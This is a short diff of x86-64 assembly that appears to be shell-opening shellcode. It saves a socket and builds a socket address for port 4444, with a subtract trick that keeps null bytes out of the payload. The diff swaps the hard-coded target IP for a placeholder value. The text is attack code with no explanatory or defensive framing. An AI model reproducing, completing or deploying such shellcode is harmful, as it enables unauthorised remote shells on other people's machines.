@@ -31,8 +31,8 @@ start:
 	mov r12, rax 				; Save the socket
 
 ;Sock_addr
-	;mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
-	mov r13, 0x0345450A5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
+	mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
+	;mov r13, 0x0345450A5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
 	mov r9b, 0xFF				; The sock_addr_in is + FF from where we need it
 	sub r13, r9					; So we sub 0xFF from it to get the correct value and avoid a null
 	push r13					; Push it on the stack
